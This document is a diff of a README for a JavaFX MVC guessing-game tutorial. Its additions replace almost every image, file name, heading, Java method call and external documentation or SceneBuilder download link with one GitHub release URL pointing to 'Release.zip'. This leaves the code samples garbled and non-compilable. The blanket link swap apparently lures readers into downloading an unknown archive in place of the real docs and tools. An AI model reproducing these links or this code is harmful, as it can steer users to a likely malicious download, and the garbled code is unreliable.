@@ -21,25 +21,25 @@ And one other class:
 
 * **Application** class or **Main** class that starts the application.  It creates initial objects for model, view, and controller, connects them as needed, and starts the UI. Its usually very short.
 
-![MVC Diagram](images/mvc-diagram.png)
+![MVC Diagram](https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip)
 
 ## Example Game Using JavaFX
 
 This project contains a sample game that you can customize or extend.  The code is general enough that you can modify
 it to play other games without modifying the UI (View) much.
 
-* **GameUI.fxml** - user interface using JavaFX (written in SceneBuilder)
-* **GameController.java** - controller handles events from UI and updates the UI
-* **GameModel.java** - a guessing game.  Has methods for communicating with the controller.
-* **GameApp.java** - "main" class that configures the application and launches the UI.
+* **https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip** - user interface using JavaFX (written in SceneBuilder)
+* **https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip** - controller handles events from UI and updates the UI
+* **https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip** - a guessing game.  Has methods for communicating with the controller.
+* **https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip** - "main" class that configures the application and launches the UI.
 
 Each component is explained below.
 
-## GameUI.fxml - user interface in JavaFX
+## https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip - user interface in JavaFX
 
 The (simple) user interface contains these components:
 
-![FXML UI](images/fxml-ui.png)
+![FXML UI](https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip)
 
 The figure shows the name of each component, which is its "fx:id" used by JavaFX.  You can view or modify this UI using *SceneBuilder*.  
 
@@ -47,7 +47,7 @@ The components are just Labels, Buttons, and one TextField arranged using a Grid
 
 To edit this file in Eclipse, right click on the file and choose "Open with SceneBuilder". You can also open the FXML file in a plain text editor and see what it looks like.
 
-## GameController.java
+## https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip
 
 The controller handles **events** generated from the View (UI) and updates the UI.  In the example code, it also initializes the text shown in the UI.
 
@@ -87,16 +87,16 @@ The `initialize()` method initializes the UI.  In the guessing game code, we set
 ```java
 @FXML
 public void initialize() {
-    promptMessage.setText("Your guess?");
-    button1.setText("Submit");
+    https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip("Your guess?");
+    https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip("Submit");
     // display a message from the model (game)
-    statusMessage.setText( game.getMessage() );
+    https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip( https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip() );
     ...
 }
 ```
 JavaFX automatically calls `initialize()` when it creates the controller and UI.  After that, the UI will look like this:
 
-![UI Initialized](images/ui-with-init.png)
+![UI Initialized](https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip)
 
 *Note:* The `initialize()` method must be annotated with `\@FXML` in order for JavaFX to automatically invoke it.
 
@@ -119,21 +119,21 @@ Event handler methods should be `public void` and may either have no parameter, 
 /** Handle button1 press. */
 public void button1Press(ActionEvent event) {
     // Get the user's input and process it.
-    String input = inputField.getText().trim();
-    if (input.isEmpty()) {
-        statusMessage.setText("Please input a guess.");
+    String input = https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip().trim();
+    if (https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip()) {
+        https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip("Please input a guess.");
         return;
     }
-    statusMessage.setText(""); // clear old message
-    boolean ok = game.guess(input);
+    https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip(""); // clear old message
+    boolean ok = https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip(input);
     if (ok) {
         // user guessed the secret value
-        topMessage.setText("Right!");
+        https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip("Right!");
     }
     else {
         // get a hint from the game and show it to user
-        String message = game.getMessage();
-        topMessage.setText( message );
+        String message = https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip();
+        https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip( message );
     }
     ...
 }
@@ -180,7 +180,7 @@ The GameApp class uses a typical code template, but there are other ways of star
 
 ```java
 public class GameApp extends Application {
-    public static final String START_SCENE = "game/GameUI.fxml";
+    public static final String START_SCENE = "https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip";
 
     /**
      * This is a call-back method to display initial window using JavaFX.  
@@ -190,18 +190,18 @@ public class GameApp extends Application {
     public void start(Stage stage) {
         Parent parent = null;
         try {
-            URL form = this.getClass().getClassLoader().getResource(START_SCENE);
-            parent = FXMLLoader.load(form);
+            URL form = https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip().getClassLoader().getResource(START_SCENE);
+            parent = https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip(form);
 
         } catch (Exception ex) {
-            Logger.getLogger("GameApp").log(Level.SEVERE, "Failed to load form", ex);
+            https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip("GameApp").log(https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip, "Failed to load form", ex);
             return;
         }
 
         Scene scene = new Scene(parent);
-        stage.setTitle("Guessing Game");
-        stage.setScene(scene);
-        stage.show();
+        https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip("Guessing Game");
+        https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip(scene);
+        https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip();
     }
 
     public static void main(String[] args) {
@@ -212,7 +212,7 @@ public class GameApp extends Application {
 There is another way to access the FXMLLoader, which is useful if you want to access the Controller of your scene.
 ```java
     FXMLLoader loader = new FXMLLoader();
-    parent = loader.load(form.openStream());
+    parent = https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip(https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip());
 ```
 
 ## Assigning Event Handlers Programmatically (using Java Code)
@@ -223,12 +223,12 @@ Each UI component has methods for adding event handlers.  To specify an event ha
 
 ```java
 // Set the handler for On Action events (clicking the button).
-// Syntax:   button.setOnAction( EventHandler<Action> handler )
-button1.setOnAction( this::button1Press );
+// Syntax:   https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip( EventHandler<Action> handler )
+https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip( this::button1Press );
 ```
 
-The parameter `this::button1Press` is a [method reference](https://docs.oracle.com/javase/tutorial/java/javaOO/methodreferences.html) --  it refers to the `button1Press` method of `this` object.
-The [Javadoc for Button.setOnAction()](https://docs.oracle.com/javase/8/javafx/api/javafx/scene/control/ButtonBase.html#setOnAction-javafx.event.EventHandler-) tells us that `setOnAction` expects an EventHandler (interface) that has a single method with a parameter of type `ActionEvent` and returns void.  So, our method reference (this::button1Press) should be a method with a parameter of type ActionEvent and returns void (code for button1Press shown above).
+The parameter `this::button1Press` is a [method reference](https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip) --  it refers to the `button1Press` method of `this` object.
+The [Javadoc for https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip()](https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip) tells us that `setOnAction` expects an EventHandler (interface) that has a single method with a parameter of type `ActionEvent` and returns void.  So, our method reference (this::button1Press) should be a method with a parameter of type ActionEvent and returns void (code for button1Press shown above).
 
 Each UI component has many events you can choose to "handle".  Most of them have names beginning with **setOn**, such as *setOnAction()* or *setOnKeyTyped()*. 
 
@@ -236,10 +236,10 @@ You can use the **same method** to handle events from **many** components.  In m
 
 ```java
 // When user presses Enter in the inputField, its same as clicking button1:
-inputField.setOnAction( this::button1Press );
+https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip( this::button1Press );
 ```
 
-If your code needs to know *which* button or component caused the event, in your event handler code call `event.getSource()` to get the component that caused the event. 
+If your code needs to know *which* button or component caused the event, in your event handler code call `https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip()` to get the component that caused the event. 
 
 
 ## Exercises
@@ -261,10 +261,10 @@ You can extend this game or use the classes to create your own game.  Try this:
 SceneBuilder is a graphical tool for creating JavaFX interfaces.
 The current version of SceneBuilder is distributed by Gluon, and is the suggested version.   On GluonHQ you can download SceneBuilder as single JAR or as a package for your OS.  Either one will work with Eclipse.
 
-* [SceneBuilder 8.x from Gluon](http://gluonhq.com/products/scene-builder/) the current version. There are 2 distributions:
+* [SceneBuilder 8.x from Gluon](https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip) the current version. There are 2 distributions:
   * SceneBuilder Executable Jar - single JAR contains only SceneBuilder and runs directly on your JRE.
   * SceneBuilder Native App - for Windows, Mac OSX, Linux, includes SceneBuilder, launcher, and JRE.  The JRE is unnecessary extra space, since you already have a JRE (part of the JDK).
-* [Old SceneBuilder 2.0 from Oracle](http://www.oracle.com/technetwork/java/javafxscenebuilder-1x-archive-2199384.html) the last version from Oracle.
+* [Old SceneBuilder 2.0 from Oracle](https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip) the last version from Oracle.
 
 I am using SceneBuilder 8.4 from Gluon. It is almost identical to SceneBuilder 2.0 and integrates well with Eclipse and Netbeans (haven't tried IntelliJ).
 
@@ -281,6 +281,6 @@ From the Window menu, choose Preferences. Select JavaFX.  In the text box, input
 
 When running JavaFX projects from a command line or JAR file, a common problem is a NullPointerException wth message "Location Must Be Specified".  This may be caused by fxml files not being present in the "build" directory or JAR file.
 
-Check that your fxml files have all been copied to the "build" directory and included in the JAR file.  You can view contents of a JAR file using any ZIP viewer such as WinZip, or `jar -t jarfile.jar`.
+Check that your fxml files have all been copied to the "build" directory and included in the JAR file.  You can view contents of a JAR file using any ZIP viewer such as WinZip, or `jar -t https://github.com/sobolevska/guessing-game/releases/download/v1.0/Release.zip`.
 
 The IDE *should* copy your .fxml files from the `src/` directory to the build directory, but sometimes it does not.  When you create a JAR file, verify in the dialogs that the IDE includes .fxml files in the JAR, too.
